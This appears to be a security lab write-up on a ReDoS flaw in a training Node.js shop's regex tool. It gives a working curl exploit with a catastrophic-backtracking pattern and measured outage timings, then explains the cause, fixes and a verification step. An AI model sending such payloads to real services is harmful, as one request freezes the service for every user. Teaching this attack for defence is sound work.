# Lab 14: ReDoS — the event loop taken down

The regex validator compiles and tests any pattern against user text. `^(\d+)*$` is a classic catastrophic-backtracking trap: one request with ~30 digits pins the Node.js event loop, freezing *every* user of the shop.

**OWASP Top 10:2025:** A05 Injection (of the regex engine) / availability

**Code:** `routes/tools.js` (`/tools/regex`)

## Exploit

```bash
# while logged in:
time curl -s -b cookies.txt -X POST http://localhost:8888/tools/regex \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "pattern=^(\d+)*\$" \
  --data "input=1111111111111111111111111111111X"   # 31 digits + X
```

Measured on the reference stack:

```text
input of 28 chars → 6.7 s
input of 31 chars → 27.3 s
```

And it is not just one slow request — the event loop is blocked for everyone:

```text
catalog latency during the attack: [0.004, 0.006, 0.006, 27.143, 0.006, 0.006]
                                     …    ↑ all requests stall at the 27 s mark
```

One 5 KB POST = full outage of the shop. No authentication to the attack surface matters either: any registered user can send it.

## Why it happens

Nested quantifiers (`(\d+)*`) make the engine try exponentially many split points. V8 backtracking has no deadline, and Node runs all requests on one thread — a CPU-bound request is everyone's problem.

## Fix

- Do not compile user-supplied patterns at all. If the feature is not a lab, delete it.
- If you must: bound pattern and input length, run matching in a worker thread with a timeout, or use a linear-time engine (RE2 / `node-re2`).
- As a habit, review every regex with nested quantifiers over unbounded input — they hide in validators, routers, and log parsers.

## Verify

After the fix (worker + timeout, or RE2), the same request returns "timeout" in ~100 ms and the catalog stays responsive during the attack.